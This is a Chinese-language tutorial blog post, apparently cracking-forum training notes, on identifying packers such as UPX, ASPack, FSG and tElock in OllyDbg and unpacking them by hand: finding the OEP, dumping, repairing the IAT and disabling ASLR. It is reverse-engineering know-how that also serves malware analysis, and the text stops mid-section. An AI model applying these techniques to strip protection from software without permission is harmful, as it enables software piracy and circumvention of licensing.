.NET\n\n{% asset_img NET.png NET %}\n\n.NET编译的程序放在OD调试会出现错误，推荐使用专门的net反编译工具。 \n\n{% asset_img NET_OD.png NET_OD %}\n\n## 1.8 AutoIt\n\n{% asset_img AutoIt.png AutoIt %}\n\n在OD中文搜索引擎可以看到它是用AutoIt v3编译的。\n\n```\n中文搜索引擎, 条目 504\n 地址=0014A9F1\n 反汇编=push 吾爱破解.001E26A8\n 文本字符串=AutoIt v3 GUI\n```\n\n## 1.9 PB\n\n{% asset_img PB.png PB %}\n\nPB可能也是跟易语言的独立编译一样，调用VC的链接程序编译，所以才显示VC6。但它还另加了两个库：`libjcc.dll`和`pbvm90.dll`。\n\n```asm\nExecutable modules\n基址       大小       入口       名称       文件版本          路径\n009E0000   0007C000   00A10640   libjcc     4.2.5.06          F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\libjcc.dll\n10000000   0000B000   10001B30   吾爱破解       1,0,0,1           F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\吾爱破解论坛学习脱壳实例_PB.exe\n10B00000   003F3000   10DB9000   pbvm90     9.0.3.8784        F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\pbvm90.dll\n```\n\n## 1.10 QT\n\n{% asset_img QT.png QT %}\n\n查壳可看到QT编译，并且OD的`E`模块也看到了有关QT的库。\n\n```asm\nExecutable modules\n基址       大小       入口       名称       文件版本          路径\n00400000   0000D000   004014C0   52pojie    0.0.0.0           F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\52破解脱壳实例\\52pojie.exe\n01090000   00633000   01091420   Qt5Widge   5.4.1.0           F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\52破解脱壳实例\\Qt5Widgets.dll\n016D0000   002AD000   016D1420   icuin53                      F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\52破解脱壳实例\\icuin53.dll\n61940000   00505000   61941420   Qt5Gui     5.4.1.0           F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\52破解脱壳实例\\Qt5Gui.dll\n64940000   00014000   64941420   libwinpt   1, 0, 0, 0        F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\52破解脱壳实例\\libwinpthread-1.dll\n66500000   01499000   66501420   icudt53                      F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\52破解脱壳实例\\icudt53.dll\n68430000   0003F000   68462D70   glu32      10.0.19041.1288   C:\\Windows\\SysWOW64\\glu32.dll\n68880000   004A6000   68881420   Qt5Core    5.4.1.0           F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\52破解脱壳实例\\Qt5Core.dll\n68F80000   001B3000   68F81420   icuuc53                      F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\52破解脱壳实例\\icuuc53.dll\n694A0000   00103000   69573D60   opengl32   10.0.19041.1081   C:\\Windows\\SysWOW64\\opengl32.dll\n6C640000   0009F000   6C678870   apphelp    10.0.19041.1288   C:\\Windows\\SysWOW64\\apphelp.dll\n6E940000   00024000   6E941420   libgcc_s                     F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\52破解脱壳实例\\libgcc_s_dw2-1.dll\n6FC40000   00101000   6FC41420   libstdc+                     F:\\吾爱破解培训\\吾爱破解培训第一课例子\\无壳程序\\52破解脱壳实例\\libstdc++-6.dll\n```\n\n## 1.11 VB\n\n```asm\n0040129A  - FF25 AC104000   jmp dword ptr ds:[<&msvbvm60.#ThunRTMain_100>]            ; msvbvm60.ThunRTMain\n004012A0 >  68 582E4000     push dumped_.00402E58\n004012A5    E8 F0FFFFFF     call <jmp.&msvbvm60.#ThunRTMain_100>\n```\n\n\n\n# 2. 如何判断是否加壳\n\n1. 通过查壳工具中内置各种壳的十六进制特征码进行对比查壳\n2. 通过程序入口特征与区段信息来判断\n\n# 3. 程序加的是什么壳\n\n未加壳、压缩壳、传统加密壳、代码虚拟化保护、.Net程序加密...\n\n## 3.1 压缩壳\n\n尽量减少可执行文件的大小。\n\n### 3.1.1 ASPacK\n\n{% asset_img ASPacK.png ASPacK %}\n\n```asm\n00803001 >  60              pushad\n```\n\n看到`m`模块，除了最基本VS编译特点的区段，ASPacK壳还加了`.aspack`与`.adata`模块，这两个模块都可以在加壳时自定义名字。\n\n```asm\nMemory map\n地址       \t大小       属主      \t 区段       包含                         类型   访问     初始访问  已映射为\n007B0000   00001000   吾爱破解                  PE 文件头                     Imag   R         RWE\n007B1000   00031000   吾爱破解       .text      代码                         \tImag   R       RWE\n007E2000   0000D000   吾爱破解       .rdata     数据                          Imag   R       RWE\n007EF000   00007000   吾爱破解       .data                                   Imag   R         RWE\n007F6000   00004000   吾爱破解       .rsrc      资源                          Imag   R       RWE\n007FA000   00009000   吾爱破解       .reloc                                  Imag   R         RWE\n00803000   00003000   吾爱破解       .aspack    SFX,输入表                    Imag   R         RWE\n00806000   00001000   吾爱破解       .adata                                  Imag   R         RWE\n```\n\n### 3.1.2 UPX\n\n{% asset_img UPX.png UPX %}\n\n```asm\n00287170 > $  60            pushad\n```\n\n## 3.2 加密壳\n\n抵抗各类调试器和逆向，可能会加入大量干扰代码。\n\n### 3.2.1 Themida\n\n{% asset_img Themida.png Themida %}\n\n从查壳工具看到它有个区段没名字，并且最后两段是随机名称。而且它与其他加壳的入口处不一样，不是`pushad`而是三个push\n\n```asm\n00AC4000 >  56              push esi                                 ; 吾爱破解.<ModuleEntryPoint>\n00AC4001    50              push eax\n00AC4002    53              push ebx\n00AC4003    E8 01000000     call 吾爱破解.00AC4009\n00AC4008    CC              int3\n```\n\n但F8运行一段后也是可以发现有`pushad`\n\n```asm\n008BC76D    89E8            mov eax,ebp\n008BC76F    89E2            mov edx,esp\n008BC771    60              pushad\n008BC772    E8 00000000     call 吾爱破解.008BC777\n```\n\n### 3.2.2 VMProtect\n\n{% asset_img VMProtect.png VMProtect %}\n\n可看VMProtect有很多个段，一些段的首字节显示`ZERO SIZE`。载入OD代码看起来也很乱\n\n```asm\n007433CC    E8 F6EFFCFF     call 吾爱破解.007123C7\n007433D1    48              dec eax\n007433D2    DE1F            ficomp word ptr ds:[edi]\n007433D4    ff5e 43         call far fword ptr ds:[esi+0x43]\n007433D7    29F0            sub eax,esi\n007433D9    3950 3F         cmp dword ptr ds:[eax+0x3F],edx          ; 吾爱破解.00610000\n007433DC    16              push ss\n007433DD    17              pop ss\n007433DE    F8              clc\n```\n\n进入第一个函数可以看到类似于加密的`pushfd`标志吧。\n\n```asm\n007123C7    9C              pushfd\n007123C8    9C              pushfd\n007123C9    C74424 08 1F660>mov dword ptr ss:[esp+0x8],0xA00A661F\n007123D1    9C              pushfd\n007123D2    E9 B58D0000     jmp 吾爱破解.0071B18C\n```\n\n### 3.2.3 Shielden\n\n{% asset_img Shielden.png Shielden %}\n\n```asm\n0050B119 > $ /EB 08         jmp short 吾爱破解.0050B123\n0050B11B     |00            db 00\n0050B11C     |C8            db C8\n0050B11D     |10            db 10\n0050B11E     |00            db 00\n0050B11F     |00            db 00\n0050B120     |00            db 00\n0050B121     |00            db 00\n0050B122     |00            db 00\n0050B123   >^\\E9 E5F2FFFF   jmp 吾爱破解.0050A40D\n0050B128   .  1978 5B       sbb dword ptr ds:[eax+0x5B],edi          ;  吾爱破解.<ModuleEntryPoint>\n0050B12B   >  0f93c3        setae bl\n0050B12E   .  FEC1          inc cl\n0050B130   .  8BDE          mov ebx,esi                              ;  吾爱破解.<ModuleEntryPoint>\n0050B132   .  60            pushad\n0050B133   .  F6DF          neg bh\n```\n\nF8走几下，也能看到明显的Shielden加壳特征。\n\n```asm\n0050A40D   > /E8 1C000000   call 吾爱破解.0050A42E                       ;  PUSH ASCII \"Safengine Shielden v2.3.6.0\"\n0050A412   . |53 61 66 65 6>ascii \"Safengine Shield\"\n0050A422   . |65 6E 20 76 3>ascii \"en v2.3.6.0\",0\n0050A42E   > |9C            pushfd\n```\n\n# 4. 脱壳详解\n\n以下脱壳都是用吾爱专用虚拟机进行操作，因为Win7/8/10(以后仅称Win10)脱壳太不友好，导致各种各样的问题出现。比如Win10系统下LoadPE只显示系统进程、脱壳后的程序无法正常运行(原因是ASLR基地址随机化脱壳插件获取的地址不对)，这些问题在XP系统都可以得到解决。\n\n脱壳后的程序回到Win10运行不了的问题，也是因为ASLR基地址随机化。ASLR（Address space layout randomization）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。\n\n在XP虚拟机用LoadPE和Scylla结合脱壳后的程序，移到Win10就打不开的情况(点击后加载了一下主程序却没出来)。OD载入看看\n\n```asm\n00F42CA0    8BFF            mov edi,edi                              ; dumped_S.<ModuleEntryPoint>\n00F42CA2    55              push ebp\n00F42CA3    8BEC            mov ebp,esp\n00F42CA5    83EC 10         sub esp,0x10\n00F42CA8    A1 B0074400     mov eax,dword ptr ds:[0x4407B0]\n```\n\n下面是XP系统同一代码位置的情况\n\n```asm\n00422CA0    8BFF            mov edi,edi\n00422CA2    55              push ebp\n00422CA3    8BEC            mov ebp,esp\n00422CA5    83EC 10         sub esp,0x10\n00422CA8    A1 B0074400     mov eax,dword ptr ds:[0x4407B0]\n```\n\n发现第5行都是`4407B0`，肯定不对，推测在Win10下这个偏移地址为`F607B0`(这个地址还会变，因为每次载入程序地址都会随机化)。为了让程序能在Win10正常运行，只需将文件或系统的ASLR取消即可。最好不要取消系统的ASLR，涉及安全问题。\n\n取消文件的ASLR的两种方法：\n\n1. 打开LoadPE->PE编辑器->特征值后面三个点->将重定位已分离勾选->确定->保存->确定\n2. 打开CFF Explorer->载入文件->File Header->Click Here->将`relocation info stripped from file`勾选->OK\n\n在XP中取消再移到Win10或直接在Win10取消都行。\n\n## 4.1 UPX\n\n做作业前推荐观看ximo脱壳基础——手脱UPX壳\n\n{% asset_img hw_UPX.png hw_UPX %}\n\n用ExeinfoPE查壳可知它是UPX壳，并且可以知道区段的名字可以随意改变，所以用区段名字判断它是什么壳其实不准确。UPX脱壳非常简单，只需利用UPX脱壳工具即可。\n\n```\nD:\\CTF\\tools\\upx>upx -d 吾爱破解培训第一课作业一.exe -o 1.exe\n                       Ultimate Packer for eXecutables\n                          Copyright (C) 1996 - 2020\nUPX 3.96w       Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020\n\n        File size         Ratio      Format      Name\n   --------------------   ------   -----------   -----------\nupx: 吾爱破解培训第一课作业一.exe: CantUnpackException: file is modified/hacked/protected; take care!!!\n\nUnpacked 0 files.\n```\n\n呃...脱壳工具好鸡肋，看了ximo的手脱UPX壳，现在4种方法都来试试吧。\n\n### 4.1.1 单步跟踪法\n\n一路F8，遇到向上跳转不实现，向下跳转忽略。\n\n遇到向上跳转时，有两种方法饶过：\n\n1. 选中向上跳转指令的下一条指令F4(运行至光标处)\n2. 选中向上跳转指令的下一条指令F2->F9->F2(下断点->运行->取消断点)\n\n如果向上跳转的下一条指令是跳转指令或是call指令，那就在下下一条指令进行操作，以此类推。\n\n```asm\n00F87757    61              popad\n00F87758    8D4424 80       lea eax,dword ptr ss:[esp-0x80]\n00F8775C    6A 00           push 0x0\n00F8775E    39C4            cmp esp,eax\n00F87760  ^ 75 FA           jnz short 吾爱破解.00F8775C\n00F87762    83EC 80         sub esp,-0x80\n00F87765  - E9 4266FCFF     jmp 吾爱破解.00F4DDAC\n```\n\n经过漫长的上述重复操作后，终于来到了第7行的大跳转处，大跳转在加壳程序中往往意味着OEP(注意第1行的popad，其它方法会用到)。\n\n```asm\n00F4DDAC    E8 EF4E0000     call 吾爱破解.00F52CA0\n00F4DDB1  ^ E9 79FEFFFF     jmp 吾爱破解.00F4DC2F\n00F4DDB6    3B0D B007F700   cmp ecx,dword ptr ds:[0xF707B0]\n```\n\n以上就是真正程序的起始处，结合1所学的各种语言编译后代码的特点，猜测该程序是由VS编译的。\n\n### 4.1.2 ESP定律\n\n入口代码第1行是`pushad`，经过这一条指令后，在寄存器的ESP右键->数据窗口中跟随，来到数据窗口，选中第一个hex数据右键->断点->硬件访问->Word(或者在命令窗口输入`hr esp`回车)，F9运行，取消硬件断点，之后就按照4.1.1的方法走，一直走到OEP。\n\n### 4.1.3 2次内存镜像法\n\n`M`模块查看内存，找到程序领空的`.rsrc`表，也就是资源表。虽然吾爱把表名改了，但还是可以在包含里看到“资源”字样，就在`.cn`处。这里注意，如果资源表是单独一个，就用2次内存镜像，如果与其他表合在一起，只用1次内存镜像即可。\n\n```asm\nMemory map\n地址         大小       属主           区段       包含                         类型   访问    初始访问  已映射为\n00160000   00001000   吾爱破解                  PE 文件头                     Imag   R         RWE\n00161000   00039000   吾爱破解           www.                                Imag   R         RWE\n0019A000   0001E000   吾爱破解       52pojie    SFX,代码                      Imag   R         RWE\n001B8000   00005000   吾爱破解            .cn   数据,输入表,资源               Imag   R         RWE\n```\n\n①如果`.rsrc`单独一个节，选中`.rsrc`右键->在访问上设置中断->F9。再找一次内存，在PE文件头的下一节地址，也就是161000处下断点，运行，删除断点。\n\n②如果`.rsrc`并不是单独一个节，只需在PE文件头的下一节地址，也就是161000处下断点，运行，删除断点。\n\n之后按照4.1.1的方法走。\n\n### 4.1.4 一步直达法\n\n绝大部分UPX壳和AsPack壳都可以用这种方法。载入OD后可直观看到`pushad`，既然有`pushad`那肯定有`popad`。右键->查找->命令，输入`popad`，不需要勾选整个块。之后与4.1.1同。\n\n在虚拟机的OD找到OEP后，三种方法dump下来。\n\n①用OllyDump插件，起始地址是`E`模块的第一行的`00400000`，大小为`5D000`，OEP的地址为`0041DDAC`，修正的是偏移地址，所以是`0041DDAC-00400000=1DDAC`，代码基址和数据基址可以在`M`模块看，代码基址是`3A000`，数据基址是`58000`。用方式1脱壳，保存为`ODdump1.exe`，可以运行，载入exeinfoPE说有不知名的壳在保护，但点一下插件Advanced Scan就可看到是由VS2008编译的。\n\n{% asset_img ODdump1.jpg ODdump1 %}\n\n在PEID可以直接看到是由VS2008编译的。\n\n{% asset_img ODdump11.jpg ODdump11 %}\n\n`ODdump1.exe`载入OD后还是显示有压缩代码的存在。\n\n{% asset_img ODdump12.jpg ODdump12 %}\n\n那UPX壳到底有没有脱干净呢？其实只要脱壳后的程序可以正常运行，OEP入口代码为无壳代码特征，IAT解密完资源没有被压缩即可。 \n\n②用OllyDump插件，与①完全相同，只是用方式2脱壳，保存为`ODdump2.exe`，不可运行。\n\n{% asset_img ODdump2.jpg ODdump2 %}\n\n③打开LoadPE，找到OD进程，右键->修复镜像大小->右键->完整转存，将正在调试的程序完整地转存下来，自动生成一个`dumped.exe`文件，不可运行，壳还没脱。**注意，先别关掉OD。**打开ImportREC，找到原本的程序(不是`dumped.exe`)，将OEP改为`1DDAC`->自动查找IAT->获取输入表，没有无效函数，转储到文件，选中`dumped.exe`打开，会自动生成一个`dumped_.exe`。这时，`dumped_.exe`可以运行。\n\n{% asset_img dumped.jpg dumped %}\n\n{% asset_img dumped1.jpg dumped1 %}\n\n{% asset_img dumped_.jpg dumped_ %}\n\n## 4.2 ASPacK\n\n{% asset_img ASPacK.png ASPacK %}\n\nASPacK壳都可以用以上4种方法。现在用单步跟踪法温故知新。F8运行到第2行主程序就出来了，也就是我们所说的“跑飞了”。所以要F7跟进去，以后同理。\n\n```asm\n00430001 >  60              pushad\n00430002    E8 03000000     call QQ个性网.0043000A\n00430007  - E9 EB045D45     jmp 45A004F7\n```\n\n单步跟踪法与F7、F8结合，运行至`retn`指令后出来的就是真正程序开始的地方。\n\n在一步直达法查找`popad`时会遇到很多个`popad`可能都不是我们需要的，在不知道哪个是我们所要的`popad`情况下，最好不要用这种方法。\n\n### 4.2.1 模拟跟踪法\n\n模拟跟踪法包括SFX模拟跟踪都是让OD自动查找程序OEP。\n\n`M`模块，在程序领空找到包含SFX的区段的地址。在命令窗口输入`tc eip < 包含SFX的区段的地址`回车，OD会自动跟踪OEP，但这个过程可能会有点漫长。跟踪完后OD会跳到`C`模块的某条指令上，这条指令可能是OEP，也可能是将要到OEP，需要单步跟踪到达OEP。\n\n### 4.2.2 SFX模拟跟踪\n\n选项->调试设置->SFX，选块方式跟踪或字节方式跟踪，视情况而定。重载后自动跳到OEP或将要到OEP处。\n\n## 4.3 nsPack\n\n{% asset_img nsPack.png nsPack %}\n\nnsPack壳是北斗的壳，可以用上面6种方法手动脱壳，过程与脱ASPacK壳一样。\n\nnsPack壳作业用①方法用PEID查壳第一行Unknown，第二行显示VS2008，程序正常运行，载入OD也正常。用②方法查壳同①，程序不能正常运行，错误提示“应用程序正常初始化(0xc0000005)失败”，这时用importREC自动查找IAT就可正常运行，载入OD正常。用③方法全部同①。\n\n## 4.4 FSG 2.0\n\n{% asset_img FSG.png FSG %}\n\n### 4.4.1 单步跟踪法\n\n单步跟踪到这三个连续跳转处，第1行代码向上跳，绕过。第2行代码跳到1D4地址处，刚好绕过第3行的大跨度跳转。\n\n```asm\n004001CD  ^\\78 F3           js short qqspirit.004001C2\n004001CF    75 03           jnz short qqspirit.004001D4\n004001D1  - FF63 0C         jmp dword ptr ds:[ebx+0xC]               ; qqspirit.0040A86D\n004001D4    50              push eax                                 ; qqspirit.0042CBC6\n```\n\n选中1D1地址，F4运行至此处。F8就跳到了OEP。\n\n### 4.4.2 ESP定律\n\n在程序起始处执行到的第一个`push`指令后，用ESP定律法。\n\n```asm\n00400154 >  8725 04A24700   xchg dword ptr ds:[0x47A204],esp\n0040015A    61              popad\n0040015B    94              xchg eax,esp\n0040015C    55              push ebp\n0040015D    A4              movs byte ptr es:[edi],byte ptr ds:[esi]\n```\n\n之后同单步跟踪。\n\n### 4.4.3 特殊的ESP定律\n\nFSG 2.0专用的ESP定律。\n\n```asm\n00400154 >  8725 04A24700   xchg dword ptr ds:[0x47A204],esp\n0040015A    61              popad\n0040015B    94              xchg eax,esp\n```\n\n执行到`popad`后(程序起始处就有`popad`而没有`pushad`)，查看堆栈窗口。\n\n```asm\n0047A208   004001E8  qqspirit.004001E8\n0047A20C   004001DC  qqspirit.004001DC\n0047A210   004001DE  qqspirit.004001DE\n0047A214   0040A86D  qqspirit.0040A86D\n```\n\n顺数第4行就是OEP。选中右键->在反汇编窗口中跟随，发现在反汇编窗口全是空代码，右键->断点->硬件执行，F9运行(或Shift+F9)即可看到代码。如果反汇编窗口中还是看到类似于数据的东西，右键->分析->从模块中删除分析就可看到代码了。\n\n用脱壳的三种方法脱壳后程序查壳都显示完美脱壳了，是由V6编译的。\n\n{% asset_img fsgoddump1.jpg fsgoddump1 %}\n\n然而三个都不能正常运行，那可能需要我们手动修复IAT。在真正程序段随便找一个call或mov系统函数的偏移地址，比如425210，它的函数名`kernel32.GetVersion`。\n\n```asm\n0040A86D  /.  55            push ebp                                 ;  oleaut32.770F0000\n0040A86E  |.  8BEC          mov ebp,esp\n0040A870  |.  6A FF         push -0x1\n0040A872  |.  68 78794200   push qqspirit.00427978\n0040A877  |.  68 F4E14000   push qqspirit.0040E1F4                   ;  SE 处理程序安装\n0040A87C  |.  64:A1 0000000>mov eax,dword ptr fs:[0]\n0040A882  |.  50            push eax\n0040A883  |.  64:8925 00000>mov dword ptr fs:[0],esp\n0040A88A  |.  83EC 58       sub esp,0x58\n0040A88D  |.  53            push ebx                                 ;  qqspirit.0047A208\n0040A88E  |.  56            push esi                                 ;  qqspirit.0042C0C8\n0040A88F  |.  57            push edi                                 ;  qqspirit.004252AC\n0040A890  |.  8965 E8       mov [local.6],esp\n0040A893  |.  FF15 10524200 call dword ptr ds:[0x425210]             ;  kernel32.GetVersion\n```\n\n可以在importREC中填好OEP->自动查找IAT->获取输入表，验证虚拟地址为25210处是否为`GetVersion`函数。\n\n{% asset_img GetVersion.jpg GetVersion %}\n\n在OD的命令窗口输入`d 425210`回车，数据窗口会刷新数据，右键->长型->地址，程序中所有函数全都显示出来了。往上滑动记下第一个函数地址`425000`(再往上全是0)，往下滑动记下最后一个`kernel32`系列函数的下一个地址`425284`。\n\n回到importREC填入RVA`25000`，大小`425284-425000=284`(比较偷懒的做法就是将大小写成1000或1500，但会产生很多垃圾指针)，获取输入表->显示无效函数，无效函数少的话可以直接选中无效函数右键->剪切指针，转储到文件。这时的`dumped_.exe`可以正常运行了。(无效函数多的话右键->跟踪级别1或跟踪级别3跟一下，或者右键->插件跟踪)\n\n由于OllyDump是很久远的插件了，所以对现在的脱壳不太友好，最好是用③方法脱壳。而在③方法中importREC最好换成Scylla用作IAT修复，因为ImpREC对一些新系统的API支持不好。\n\nScylla用法跟importREC差不多，但是OEP要填`40A86D`，VA填`425000`，大小与importREC一样，同样操作，修复转储后文件。\n\n## 4.5 PEcompact\n\n{% asset_img PEcompact.png PEcompact %}\n\nPEcompact壳可以用单步跟踪、ESP定律、2次内存镜像法。\n\n使用单步跟踪时，与ASPacK一样都会跑飞，只需F7进入函数即可。\n\n使用ESP定律时，执行完两个`push`指令后再进行ESP。\n\n```asm\n0040A86D >  B8 74DE4500     mov eax,qqspirit.0045DE74\n0040A872    50              push eax                                 ; qqspirit.0045DE74\n0040A873    64:FF35 0000000>push dword ptr fs:[0]\n0040A87A    64:8925 0000000>mov dword ptr fs:[0],esp\n```\n\n使用2次内存镜像法时，程序跳到此处：\n\n```asm\n0045DE89    C602 E9         mov byte ptr ds:[edx],0xE9\n0045DE8C    83C2 05         add edx,0x5\n0045DE8F    2BCA            sub ecx,edx                              ; qqspirit.0040A883\n0045DE91    894A FC         mov dword ptr ds:[edx-0x4],ecx           ; qqspirit.0045DE97\n0045DE94    33C0            xor eax,eax\n0045DE96    C3              retn\n0045DE97    B8 F9CB45F0     mov eax,0xF045CBF9\n```\n\n如果执行`retn`再单步跟踪，程序跑飞。所以要在`retn`指令的下一条指令下断点运行，再单步跟踪到OEP。\n\n### 4.5.1 使用VirtualFree\n\n方法一：在命令窗口输入`bp VirtualFree`回车，运行。取消断点，Alt+F9返回到用户代码处。右键->查找->命令，输入`push 8000`(特征码)，取消勾选整个块，F4运行至此处，单步跟踪。\n\n方法二：在命令窗口输入`bp VirtualFree`回车，两次F9运行。取消断点，Alt+F9返回到用户代码处。单步跟踪。\n\n### 4.5.2 使用VirtualAlloc\n\n在命令窗口输入`bp VirtualAlloc`回车，运行。取消断点，Alt+F9返回到用户代码处。单步跟踪。\n\n### 4.5.3 使用GetVersion\n\n在命令窗口输入`at GetVersion`回车，反汇编窗口跳到相关代码处，F2->F9->F2。\n\n```asm\n7C81127A >  64:A1 18000000  mov eax,dword ptr fs:[0x18]\n7C811280    8B48 30         mov ecx,dword ptr ds:[eax+0x30]\n7C811283    8B81 B0000000   mov eax,dword ptr ds:[ecx+0xB0]\n7C811289    0FB791 AC000000 movzx edx,word ptr ds:[ecx+0xAC]\n7C811290    83F0 FE         xor eax,-0x2\n7C811293    C1E0 0E         shl eax,0xE\n7C811296    0BC2            or eax,edx                               ; ntdll.KiFastSystemCallRet\n7C811298    C1E0 08         shl eax,0x8\n7C81129B    0B81 A8000000   or eax,dword ptr ds:[ecx+0xA8]\n7C8112A1    C1E0 08         shl eax,0x8\n7C8112A4    0B81 A4000000   or eax,dword ptr ds:[ecx+0xA4]\n7C8112AA    C3              retn\n```\n\n一直单步到`retn`处返回父函数。往上滑动发现OEP，父函数就是真正代码处。\n\n### 4.5.4 最后一次异常法\n\n选项->调试设置->异常，将所有选项取消勾选。插件->StrongOD->skip some exceptions取消勾选。重新载入，按Shift+F9几次，直至出现主程序。\n\n比如在ximo教程中是按了Shift+F9两次后跑飞，所以可知主程序在第一次Shift+F9到第二次Shift+F9的代码之间。重新载入，去到倒数第二次的Shift+F9处，在堆栈窗口查看标有`SE处理程序`(一般是第二行)的数值`0045DE74`，在反汇编窗口Ctrl+G查找`0045DE74`，下断点，Shift+F9运行，取消断点。这就来到了与2次镜像内存法一样的地址处，单步跟踪，也要绕过`retn`指令。\n\n### 4.5.5 PEcompact的第一条指令\n\n```asm\n0040A86D >  B8 74DE4500     mov eax,qqspirit.0045DE74\n```\n\n加壳程序的第一条指令就是将偏移地址`0045DE74`赋值给eax。在命令窗口输入`bp 0045DE74`回车->运行->取消断点。后面步骤与2次镜像内存法一样的地址处，单步跟踪，也要绕过`retn`指令。\n\n## 4.6 EZIP\n\n这个可以用单步跟踪和ESP定律。这次主要讲脱壳后程序崩溃问题。用③方法脱壳没有问题，而用①和②方法都出现了找不到dll的问题。\n\n{% asset_img 没有找到dll.png 没有找到dll %}\n\n此时，只要打开LoadPE分别将`oddump1.exe`和`oddump2.exe`重建PE即可。\n\n## 4.7 tElock 0.98b1\n\n这个壳可以用最后一次异常法、模拟跟踪法、2次内存镜像法。\n\n这个程序中很多的花指令以及SEH暗桩。\n\n花指令是，由设计者特别构思，希望使反汇编的时候出错，让破解者无法清楚正确地反汇编程序的内容，迷失方向。经典的是，目标位置是另一条指令的中间，这样在反汇编的时候便会出现混乱。花指令有可能利用各种指令：jmp, call, ret的一些堆栈技巧，位置运算，等等。\n\n花指令是程序中的无用代码，程序对它没影响，少了它也能正常运行。加花指令后，杀毒软件对木马静态反汇编时，木马的代码就不会正常显示出来，加大杀毒软件的查杀难度。\n\nSEH，结构化异常处理，是WINDOWS中异常处理的机制，简单地说，就是操作系统维护一个用来处理异常的函数指针的链表，如果发生异常，系统就会顺着这个链表去调用其中的函数，直到某个异常处理函数将异常处理完了，或者所有的函数都不处理异常。\n\n使用SEH的机制来进制反调试，就是SEH暗桩。\n\n程序可以将特定的代码注册成为异常处理函数，然后故意产生一些异常。当程序被调试时，所有的异常事件，都会先发由调试器进行处理，调试器可以决定是否处理，以及如何处理；如果调试器决定不处理，程序自己注册的异常处理入口才会得到执行。对于调试器，并不能保证所有的异常都正确的识别并恰当地处理（因此OD中的很多插件都有anti-anti功能），如果因为调试器对异常情况识别有误，那么程序就会执行完全不同的一条执行路径，这样程序就可以知道自己正在被调试了。\n\n### 4.7.1 最后一次异常法\n\n选项->调试设置->异常，将所有选项取消勾选。插件->StrongOD->skip some exceptions取消勾选。重新载入，按17次Shift+F9出现主程序。\n\n重载，按16次Shift+F9后，观察堆栈窗口的`SE处理程序`数值为0042D7FD。在反汇编窗口下断点Shift+F9运行，取消断点。之后用单步跟踪。\n\n### 4.7.2 模拟跟踪法\n\n使用模拟跟踪法的前提是没有SEH暗桩。而这个程序有很多SEH暗桩。我们知道，按16次Shift+F9没有出现主程序，而在第17次出现主程序，所以第16次到第17次的这一段是没有SEH暗桩的。所以连续按16次Shift+F9再使用模拟跟踪法。\n\n### 4.7.3 2次内存镜像法\n\n2次内存镜像法即可到达OEP。\n\n用①方法脱壳出现问题：\n\n{% asset_img 无法定位程序输入点于动态库.png 无法定位程序输入点于动态库 %}\n\n可以用importREC修复。打开原加壳程序(因为用OD进程会卡死)，填好OEP->自动查找IAT->获取输入表，显示无效函数，发现有非常多的无效函数，选中右键->插件跟踪->tElock 0.98，让它自动修复无效函数，修复完后还有5个无效函数，右键->剪切指针。转储到文件，程序正常运行。\n\n用②③方法直接崩溃不出现弹窗。用importREC进行上述修复后同样可以正常运行。\n\n## 4.8 exe32pack\n\n可以用ESP定律。\n\n### 4.8.1 使用IsDebuggerPresent\n\n在命令窗口输入`bp IsDebuggerPresent`回车，运行。取消断点，Alt+F9返回到用户代码处。\n\n```asm\n0040ED24    8BBD 013C4000   mov edi,dword ptr ss:[ebp+0x403C01]\n0040ED2A    03BD 273C4000   add edi,dword ptr ss:[ebp+0x403C27]      ; sticker.00400000\n```\n\nF8执行到下一条指令，查看信息窗口：\n\n```asm\nss:[0040A167]=00400000 (sticker.00400000), ASCII \"MZ0\"\nedi=0000535F\n```\n\n基址为`400000`，偏移地址为`535F`，第二条指令就是要它俩相加，结果就是OEP=40535F\n\nCtrl+G去到40535F，F4运行至光标处，光标处即OEP。 \n\n## 4.9 WinUpack\n\n用单步跟踪法跟踪到这一步，发现这是个大跳转，然而这个跳转却没有实现。\n\n```asm\n0043E635  - 0F84 E3BDFCFF   je 跑跑排行.0040A41E\n```\n\n不能直接改为jmp，因为如果这样改的话在Scylla获取输入表时一个函数都没有。\n\n要让这个跳转实现，即eax要等于0。\n\n```asm\n0043E633    85C0            test eax,eax                             ; 跑跑排行.0040C034\n0043E635  - 0F84 E3BDFCFF   je 跑跑排行.0040A41E\n```\n\n运行到跳转指令处，右键->断点->条件，输入`eax==0`。F9运行，取消断点，F8跳转至OEP。之后用③方法dump即可。\n\n## 4.10 脱壳的基本思路及小结\n\n还有非常多的我们没见过的壳，比如KByS、RLPack、PEpack、JDPack、PEncrypt等。但基本都可以用以下几种办法解决：\n\n1. 单步跟踪\n2. ESP定律\n3. 2次内存镜像\n4. 最后一次异常法\n5. 模拟跟踪法\n6. SFX模拟跟踪\n\n压缩壳修不修正无所谓，但加密壳一定要修正镜像大小。\n\n如果脱壳后的程序无法运行，可能是IAT重定位的问题，无效指针的问题，需要重建PE的问题，包括5的疑难杂症等等。这需要慢慢探索吧。\n\n## 4.11 ASPack变形壳\n\n使用单步跟踪法、2次内存镜像法可以，但ESP定律不行。\n\n另外，对任何壳，短距离call要跟进去，远距离call可以不跟进去。\n\n### 4.11.1 利用脚本进行脱壳\n\n载入加壳程序后，插件->ODdgScript->运行脚本->打开对应的壳脚本(后缀可以为txt/osc)，自动找到程序OEP。\n\n脱壳脚本要自己收集，如果遇到一些变形壳，脱壳脚本可能就太不管用了，在运行了脱壳脚本的基础上再单步跟踪到OEP。\n\n## 4.12 ACProtect\n\n### 4.12.1 ACProtect 1.32\n\nACProtect 1.32是没有Stolen Code的，脱壳相对简单。\n\nStolen Code的意思是把被保护程序要运行的代码移走，以进行进一步的保护处理。增加分析难度，脱壳难度、增加反跟踪难度等等。 \n\n{% 